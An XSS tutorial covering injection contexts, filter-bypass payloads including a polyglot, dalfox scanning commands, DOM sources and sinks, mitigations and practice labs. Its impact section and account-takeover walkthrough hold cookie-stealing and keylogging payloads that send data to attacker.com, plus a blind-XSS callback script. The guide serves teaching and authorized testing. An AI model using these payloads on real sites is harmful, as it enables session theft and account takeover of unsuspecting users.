# What is XSS (Cross-Site Scripting)?

Cross-Site Scripting (XSS) lets an attacker inject JavaScript that runs in **another user's browser**, in the context of the vulnerable site. Because the script runs as the victim, it can do anything the victim can do: read their cookies/session, act on their behalf, or rewrite the page.

The root cause is the same as SQLi: the application takes user input and puts it into a page **without encoding it**, so the browser treats your input as HTML/JavaScript instead of text.

Example vulnerable code:

```php
// VULNERABLE - echoes user input straight into HTML
echo "<p>You searched for: " . $_GET['q'] . "</p>";
```

Request `?q=<script>alert(1)</script>` and the browser runs your script.

## Impact - why it matters

- **Session/cookie theft** -> full account takeover
- **Perform actions as the victim** (change email, transfer money, post content)
- **Keylogging / phishing** by rewriting the page (fake login form)
- **Worms** that self-propagate (Samy on MySpace)
- **Browser exploitation** via frameworks like BeEF

## Types

- **Reflected** - payload is in the request (URL/form) and bounces straight back in the response. Requires tricking the victim into clicking a crafted link.
- **Stored (persistent)** - payload is saved server-side (comment, profile name, support ticket) and fires for **every** visitor who views it. Highest impact.
- **DOM-based** - the vulnerability is entirely in client-side JavaScript that reads attacker input (e.g. `location.hash`) and writes it to the page (`innerHTML`) without sanitizing. The payload may never touch the server.

## Step 1 - Find reflection / sink points

Enter a unique harmless marker like `xss7391` into every input (search, profile, headers, URL params, JSON) and search the response for it. Where it appears tells you the **context**:

- Inside HTML body: `<p>xss7391</p>`
- Inside an attribute: `<input value="xss7391">`
- Inside a `<script>` block: `var name = "xss7391";`
- Inside a URL: `<a href="xss7391">`

## Step 2 - Break out of the context

The payload you need depends on where your input lands.

```html
<!-- HTML body context -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>

<!-- Attribute context: close the attribute/tag first -->
"><script>alert(1)</script>
" onmouseover="alert(1)
" autofocus onfocus="alert(1)

<!-- Inside <script> string: close the string/statement -->
';alert(1);//
</script><script>alert(1)</script>

<!-- href / URL context -->
javascript:alert(1)
```

## Step 3 - Filter / WAF bypass payloads

When basic payloads are blocked, try these:

```html
<!-- No parentheses -->
<script>alert`1`</script>

<!-- Case / broken tags (some naive filters) -->
<ScRiPt>alert(1)</sCrIpT>
<scr<script>ipt>alert(1)</script>

<!-- Event handlers without <script> -->
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- HTML entity / encoding tricks -->
<a href="jav&#x09;ascript:alert(1)">click</a>

<!-- Polyglot (works in many contexts at once) -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Step 4 - Prove real impact (with authorization only)

```html
<!-- Exfiltrate cookies to a server you control -->
<script>fetch('https://attacker.com/c?d='+encodeURIComponent(document.cookie))</script>

<!-- Steal cookies via image beacon (works even with strict CSP sometimes) -->
<script>new Image().src='https://attacker.com/c?d='+document.cookie</script>

<!-- Keylogger -->
<script>document.onkeypress=e=>fetch('https://attacker.com/k?c='+e.key)</script>

<!-- Blind XSS: fire a callback when an admin views your input -->
<script src="https://YOURID.xss.ht"></script>
```

> **HTTPOnly cookies** block `document.cookie` theft. When that is set, pivot to performing actions as the victim (CSRF-style requests using their session) instead.

## Tools

- [Burp Suite](https://portswigger.net/burp) - Repeater to tune context payloads, Intruder to fuzz
- [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express) / [interactsh](https://github.com/projectdiscovery/interactsh) - blind XSS callbacks
- [dalfox](https://github.com/hahwul/dalfox) - fast parameter XSS scanner
- [BeEF](https://beefproject.com/) - browser exploitation once you have XSS
- [KNOXSS](https://knoxss.me/) - hosted XSS scanner

## Commands

```bash
# Scan a list of URLs with parameters using dalfox
dalfox file urls.txt -o results.txt

# Single URL
dalfox url "https://target.tld/search?q=test"

# Find candidate parameters first, then pipe into dalfox
waybackurls target.tld | grep "=" | dalfox pipe
```

## Full walkthrough - stored XSS to account takeover

1. Post a comment: `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`
2. Comment is saved and shown on the article page.
3. An admin opens the article; their browser runs your script.
4. Your server receives the admin's session cookie.
5. You set that cookie in your browser and are now logged in as admin.

## DOM XSS specifics

Look in the JavaScript for dangerous **sinks** fed by user-controlled **sources**:

```javascript
// Sources (attacker-controlled)
location.hash, location.search, document.referrer, window.name, postMessage

// Sinks (dangerous)
element.innerHTML = ...        // renders HTML
document.write(...)            // renders HTML
eval(...)                      // runs code
location = ...                 // open redirect / javascript:
```

Example payload for `element.innerHTML = location.hash.slice(1)`:

```
https://target.tld/#<img src=x onerror=alert(1)>
```

## Mitigation - the fix

- **Context-aware output encoding** - HTML-encode for HTML, attribute-encode for attributes, JS-encode inside scripts, URL-encode in URLs. Use your framework's auto-escaping (React, Angular, Handlebars) and avoid `dangerouslySetInnerHTML` / `v-html` / `innerHTML`.
- **Content-Security-Policy (CSP)** with a strict `script-src` (nonce or hash based, no `unsafe-inline`).
- **Sanitize rich HTML** with a library like [DOMPurify](https://github.com/cure53/DOMPurify) when you must allow markup.
- **HTTPOnly + Secure + SameSite** cookies to limit session theft.
- Validate/allowlist input where a fixed format is expected.

```javascript
// Safe: DOMPurify before inserting user HTML
element.innerHTML = DOMPurify.sanitize(userInput);
```

## Practice

- [PortSwigger XSS labs](https://portswigger.net/web-security/cross-site-scripting) - free and excellent
- Google XSS Game, OWASP Juice Shop, DVWA

## Deep dive

- [XSS - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## CWE

- CWE-79: Improper Neutralization of Input During Web Page Generation
